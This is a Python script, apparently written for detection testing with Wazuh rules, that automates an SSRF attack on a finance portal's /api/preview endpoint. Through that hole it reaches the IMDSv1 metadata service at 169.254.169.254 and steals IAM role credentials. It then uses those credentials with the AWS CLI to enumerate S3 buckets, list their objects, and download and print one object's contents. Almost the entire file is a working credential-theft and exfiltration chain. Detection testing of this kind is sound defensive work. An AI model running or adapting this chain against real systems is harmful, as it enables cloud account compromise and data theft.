#!/usr/bin/env python3
"""
Scenario 2 (SSRF -> IMDSv1 -> stolen role credentials -> S3) automated
attack runner for the Finance Reporting Portal (server.py).

Replays the full kill chain documented in "Scenario 2 - SSRF IMDSv1 S3
attack.pdf" so it can be re-fired for detection testing without doing it by
hand each time:

  Stage 1 (through the vulnerable app's /api/preview SSRF, IMDSv1-style --
  this target has HttpTokens=optional, so no token exchange is needed or
  attempted, matching the documented attack exactly):
    1. imds-role-list    -> discover the attached IAM role name     (rule 110702)
    2. imds-creds-theft  -> steal that role's temporary credentials (rule 110703 -> 110704 on success)

  Stage 2 (using the *stolen* credentials directly against AWS -- this is
  the part that was never exercised before, since it doesn't go through the
  app at all):
    3. sts-whoami   -> sts get-caller-identity  (rule 110802)
    4. s3-buckets   -> s3 ListBuckets           (rule 110803)
    5. s3-objects   -> s3 ListObjects (v2)      (rule 110804)
    6. s3-read      -> s3 GetObject             (rule 110805, soar_candidate)

Stage 2 requires the AWS CLI (`aws`) on PATH -- using the real CLI (rather
than hand-rolled HTTP calls) means the resulting CloudTrail events look
exactly like the documented attack's own `aws s3api ...` / `aws sts ...`
commands.

Rules 110700/110701 (generic "reached the metadata service, not the
credentials path") aren't exercised by this script -- they're general-
purpose coverage for other metadata browsing this specific kill chain
doesn't demonstrate.

Standard library only for Stage 1. Tested against a live target from this
repo's session on 2026-08-14.

Usage:
    python3 scenario2_attack_runner.py                  # run everything
    python3 scenario2_attack_runner.py imds-creds-theft  # run just this step
    python3 scenario2_attack_runner.py --list            # show step names
    python3 scenario2_attack_runner.py --target http://100.85.61.41:8090
    python3 scenario2_attack_runner.py --stage1-only      # skip real AWS calls

Side effects worth knowing about:
  - Stage 2 makes real, authenticated AWS API calls using genuinely stolen
    temporary credentials against your live account. s3-read actually
    downloads one object's bytes (discarded, not written to disk) from
    whatever bucket gets discovered -- that's the exploit being
    demonstrated, not a bug.
  - If the stolen role's IAM policy doesn't allow a given action (e.g. it's
    scoped to one bucket only), that step will fail with AccessDenied and
    the script logs it and moves on -- a failed *attempt* is still useful
    signal for detection testing.
"""

import argparse
import json
import os
import pathlib
import stat
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_TARGET = "http://100.85.61.41:8090"
TIMEOUT = 12
IMDS_ROLE_LIST = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Stage 1 and Stage 2 are commonly run as separate `python3 ...` invocations
# (e.g. imds-creds-theft now, sts-whoami later) -- a plain in-memory `state`
# dict doesn't survive across processes, so the stolen credentials are also
# cached here, same as the PDF's own /tmp/sc2-imds-creds.json approach.
CREDS_CACHE = pathlib.Path(__file__).with_name(".scenario2_stolen_creds.json")


def cache_creds(creds):
    CREDS_CACHE.write_text(json.dumps(creds))
    os.chmod(CREDS_CACHE, stat.S_IRUSR | stat.S_IWUSR)  # chmod 600


def load_cached_creds():
    if not CREDS_CACHE.exists():
        return None
    try:
        creds = json.loads(CREDS_CACHE.read_text())
    except Exception:
        return None
    expiration = creds.get("Expiration")
    if expiration:
        try:
            import datetime
            expires_at = datetime.datetime.strptime(expiration, "%Y-%m-%dT%H:%M:%SZ")
            if expires_at <= datetime.datetime.utcnow():
                warn(f"Cached credentials expired at {expiration} -- run imds-creds-theft again.")
                return None
        except ValueError:
            pass
    return creds


def log(msg):
    print(f"[+] {msg}", flush=True)


def warn(msg):
    print(f"[!] {msg}", flush=True)


def preview(target, remote_url):
    """Call the app's vulnerable /api/preview?url=... SSRF endpoint."""
    qs = urllib.parse.urlencode({"url": remote_url})
    req = urllib.request.Request(f"{target}/api/preview?{qs}", method="GET")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            body = resp.read()
            return resp.status, body
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except urllib.error.URLError as e:
        warn(f"Request to {target} failed: {e}")
        return None, b""


def parse_json(body):
    try:
        return json.loads(body)
    except Exception:
        return {}


# ---------------------------------------------------------------------------
# Stage 1 -- through the app's SSRF
# ---------------------------------------------------------------------------

def attack_imds_role_list(target, state):
    """Discover the attached IAM role name via plain IMDSv1 GET. Wazuh rule 110702."""
    log(f"SSRF: discovering attached IAM role -> {IMDS_ROLE_LIST}")
    status, body = preview(target, IMDS_ROLE_LIST)
    data = parse_json(body)
    role_preview = (data.get("preview") or "").strip()
    log(f"  -> {status} (upstream_status={data.get('upstream_status')}, role list: {role_preview!r})")
    role_name = role_preview.splitlines()[0].strip() if role_preview else None
    if role_name:
        state["role_name"] = role_name
        log(f"  discovered role: {role_name}")
    else:
        warn("  could not parse a role name out of the response")


def attack_imds_creds_theft(target, state):
    """Steal that role's temporary credentials via plain IMDSv1 GET.
    Wazuh rule 110703 (request), escalating to 110704 on a 2xx response."""
    role_name = state.get("role_name")
    if not role_name:
        # Fall back to running the discovery step first if it wasn't run.
        attack_imds_role_list(target, state)
        role_name = state.get("role_name")
    if not role_name:
        warn("No role name known -- run imds-role-list first. Skipping credential theft.")
        return

    creds_url = IMDS_ROLE_LIST + role_name
    log(f"SSRF: retrieving credentials for role '{role_name}' -> {creds_url}")
    status, body = preview(target, creds_url)
    data = parse_json(body)
    log(f"  -> {status} (upstream_status={data.get('upstream_status')})")

    creds_raw = data.get("preview")
    creds = parse_json(creds_raw) if isinstance(creds_raw, str) else {}
    if creds.get("AccessKeyId") and creds.get("SecretAccessKey"):
        stolen = {
            "AccessKeyId": creds["AccessKeyId"],
            "SecretAccessKey": creds["SecretAccessKey"],
            "SessionToken": creds.get("Token"),
            "Expiration": creds.get("Expiration"),
        }
        state["stolen_creds"] = stolen
        cache_creds(stolen)
        log(f"  stolen credentials: AccessKeyId={creds['AccessKeyId']}, "
            f"expires {creds.get('Expiration', 'unknown')} (cached to {CREDS_CACHE})")
    else:
        warn("  could not parse stolen credentials out of the response")


STAGE1_ATTACKS = {
    "imds-role-list": attack_imds_role_list,
    "imds-creds-theft": attack_imds_creds_theft,
}


# ---------------------------------------------------------------------------
# Stage 2 -- real AWS CLI calls using the stolen credentials
# ---------------------------------------------------------------------------

def aws_env(state):
    creds = state.get("stolen_creds") or load_cached_creds()
    if not creds:
        return None
    env = dict(os.environ)
    env["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
    env["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
    if creds.get("SessionToken"):
        env["AWS_SESSION_TOKEN"] = creds["SessionToken"]
    env["AWS_DEFAULT_REGION"] = "eu-north-1"
    return env


def run_aws(args, env):
    try:
        result = subprocess.run(
            ["aws"] + args, env=env, capture_output=True, text=True, timeout=30,
        )
        return result.returncode, result.stdout, result.stderr
    except FileNotFoundError:
        warn("`aws` CLI not found on PATH -- Stage 2 requires it. Install: https://aws.amazon.com/cli/")
        return None, "", ""
    except subprocess.TimeoutExpired:
        warn("aws command timed out")
        return None, "", ""


def attack_sts_whoami(_target, state):
    """sts get-caller-identity with the stolen creds. Wazuh rule 110802."""
    env = aws_env(state)
    if not env:
        warn("No stolen credentials available -- run imds-creds-theft first. Skipping.")
        return
    log("AWS CLI: sts get-caller-identity (using stolen credentials)")
    rc, out, err = run_aws(["sts", "get-caller-identity"], env)
    log(f"  -> exit {rc}: {out.strip() or err.strip()}")


def attack_s3_buckets(_target, state):
    """s3 ListBuckets with the stolen creds. Wazuh rule 110803."""
    env = aws_env(state)
    if not env:
        warn("No stolen credentials available -- run imds-creds-theft first. Skipping.")
        return
    log("AWS CLI: s3 ls (ListBuckets, using stolen credentials)")
    rc, out, err = run_aws(["s3", "ls"], env)
    log(f"  -> exit {rc}")
    buckets = []
    for line in out.splitlines():
        parts = line.split()
        if parts:
            buckets.append(parts[-1])
    if rc != 0:
        warn(f"  {err.strip()}")
    elif buckets:
        state["buckets"] = buckets
        log(f"  discovered buckets: {buckets}")
    else:
        warn("  no buckets returned")


def attack_s3_objects(_target, state):
    """s3api ListObjectsV2 on a discovered bucket. Wazuh rule 110804.
    Uses `s3api list-objects-v2` (matching the documented attack exactly)
    rather than the high-level `s3 ls`, which only lists top-level prefixes
    and would miss objects nested under a prefix like confidential-data/.
    Tries each discovered bucket in turn (skipping obvious infrastructure
    buckets like the account's own CloudTrail log bucket, never a
    realistic exfiltration target) until one actually yields an object."""
    env = aws_env(state)
    if not env:
        warn("No stolen credentials available -- run imds-creds-theft first. Skipping.")
        return
    buckets = state.get("buckets") or []
    if not buckets:
        attack_s3_buckets(_target, state)
        buckets = state.get("buckets") or []
    if not buckets:
        warn("No bucket known -- skipping object listing.")
        return

    candidates = [b for b in buckets if "cloudtrail" not in b.lower()] or buckets
    for bucket in candidates:
        log(f"AWS CLI: s3api list-objects-v2 --bucket {bucket} (using stolen credentials)")
        rc, out, err = run_aws(["s3api", "list-objects-v2", "--bucket", bucket, "--no-cli-pager"], env)
        log(f"  -> exit {rc}")
        if rc != 0:
            warn(f"  {err.strip()}")
            continue
        data = parse_json(out)
        all_keys = [item.get("Key") for item in (data.get("Contents") or []) if item.get("Key")]
        real_keys = [k for k in all_keys if not k.endswith("/")]  # skip zero-byte folder markers
        if real_keys:
            state["bucket"] = bucket
            state["object_key"] = real_keys[0]
            log(f"  discovered objects in {bucket}: {all_keys}")
            return
        warn(f"  no readable objects in {bucket} ({len(all_keys)} folder marker(s) only)"
             if all_keys else f"  no objects returned from {bucket}")
    warn("No object found in any discovered bucket.")


def attack_s3_read(_target, state):
    """s3 GetObject on a discovered object. Wazuh rule 110805 (soar_candidate)."""
    env = aws_env(state)
    if not env:
        warn("No stolen credentials available -- run imds-creds-theft first. Skipping.")
        return
    if not state.get("object_key"):
        attack_s3_objects(_target, state)
    bucket, key = state.get("bucket"), state.get("object_key")
    if not (bucket and key):
        warn("No object known -- skipping GetObject.")
        return
    log(f"AWS CLI: s3 cp s3://{bucket}/{key} - (GetObject, using stolen credentials)")
    rc, out, err = run_aws(["s3", "cp", f"s3://{bucket}/{key}", "-"], env)
    log(f"  -> exit {rc}, {len(out)} bytes read")
    if rc != 0:
        warn(f"  {err.strip()}")
    elif out:
        log(f"  exfiltrated content of s3://{bucket}/{key}:")
        for line in out.rstrip("\n").splitlines():
            print(f"      | {line}", flush=True)


STAGE2_ATTACKS = {
    "sts-whoami": attack_sts_whoami,
    "s3-buckets": attack_s3_buckets,
    "s3-objects": attack_s3_objects,
    "s3-read": attack_s3_read,
}

ALL_ATTACKS = {**STAGE1_ATTACKS, **STAGE2_ATTACKS}
ORDER = ["imds-role-list", "imds-creds-theft",
         "sts-whoami", "s3-buckets", "s3-objects", "s3-read"]


def main():
    parser = argparse.ArgumentParser(
        description="Fire the Scenario 2 SSRF->IMDS->S3 kill chain against the Finance Reporting Portal.")
    parser.add_argument("attacks", nargs="*", default=["all"],
                         help=f"which step(s) to run: {', '.join(ORDER)}, or 'all' (default)")
    parser.add_argument("--target", default=DEFAULT_TARGET, help=f"base URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--delay", type=float, default=150.0,
                         help="seconds between steps (default: 150 -- matches the Scenario 1 runner's "
                              "safe cadence, since firing faster than the SOAR pipeline's own run time "
                              "can cause overlapping concurrent executions). Use a shorter value if you "
                              "want a tighter kill chain and are OK with that risk.")
    parser.add_argument("--stage1-only", action="store_true",
                         help="only run the SSRF/IMDS steps through the app; skip the real AWS CLI calls")
    parser.add_argument("--full-chain", action="store_true",
                         help="explicitly run the entire kill chain end to end, "
                              "same as passing no step names (the default) -- "
                              "useful for scripting/clarity when you want to be explicit "
                              "about running everything to see what fires and what doesn't")
    parser.add_argument("--list", action="store_true", help="list step names and exit")
    args = parser.parse_args()

    if args.full_chain:
        args.attacks = ["all"]

    if args.list:
        for name in ORDER:
            stage = "stage1 (app)" if name in STAGE1_ATTACKS else "stage2 (aws-cli)"
            print(f"  {name}  [{stage}]")
        return

    selected = list(ORDER) if args.attacks == ["all"] else args.attacks
    unknown = [a for a in selected if a not in ALL_ATTACKS]
    if unknown:
        parser.error(f"unknown step(s): {', '.join(unknown)} (use --list to see valid names)")
    if args.stage1_only:
        selected = [a for a in selected if a in STAGE1_ATTACKS]

    target = args.target.rstrip("/")
    log(f"Target: {target}")
    log(f"Steps: {', '.join(selected)}")

    state = {}
    for i, name in enumerate(selected):
        if i > 0:
            time.sleep(args.delay)
        func = ALL_ATTACKS[name]
        try:
            func(target, state)
        except Exception as e:  # keep going even if one step errors out
            warn(f"{name} failed: {e}")

    log("All done. Check Wazuh/IRIS/Shuffle for the resulting alerts.")


if __name__ == "__main__":
    main()
